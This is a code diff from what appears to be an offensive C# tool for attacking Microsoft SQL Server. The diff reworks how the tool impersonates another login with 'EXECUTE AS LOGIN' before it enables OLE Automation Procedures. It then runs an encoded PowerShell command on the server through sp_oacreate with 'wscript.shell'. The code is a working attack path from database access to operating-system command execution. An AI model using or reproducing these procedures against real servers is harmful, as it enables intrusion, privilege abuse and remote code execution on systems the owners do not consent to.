@@ -68,12 +68,15 @@ Optional arguments:
                 return;
             }
 
-            var procedures = new Dictionary<string, string>();
-
+            // I am confused about why it is necessary to perform this step as a separate procedure
+            // But it seems in-line impersonation doesn't work properly
             if (!String.IsNullOrEmpty(argumentSet.impersonate))
             {
-                procedures.Add($"Attempting impersonation as {argumentSet.impersonate}..", $"EXECUTE AS LOGIN = '{argumentSet.impersonate}';");
+                Console.WriteLine("[*] Attempting impersonation as {0}", argumentSet.impersonate);
+                SQLExecutor.ExecuteProcedure(connection, "", argumentSet.impersonate);
             }
+
+            var procedures = new Dictionary<string, string>();
 
             procedures.Add("Enabling OLE Automation Procedures..", $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;");
             procedures.Add("Executing command..", $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc {cmd}';");
@@ -85,7 +88,11 @@ Optional arguments:
 
                 if (String.IsNullOrEmpty(argumentSet.target) && String.IsNullOrEmpty(argumentSet.intermediate))
                 {
-                    SQLExecutor.ExecuteProcedure(connection, procedures[step]);
+                    SQLExecutor.ExecuteProcedure(
+                        connection, 
+                        procedures[step],
+                        argumentSet.impersonate
+                        );
                 }
                 else if (String.IsNullOrEmpty(argumentSet.intermediate))
                 {
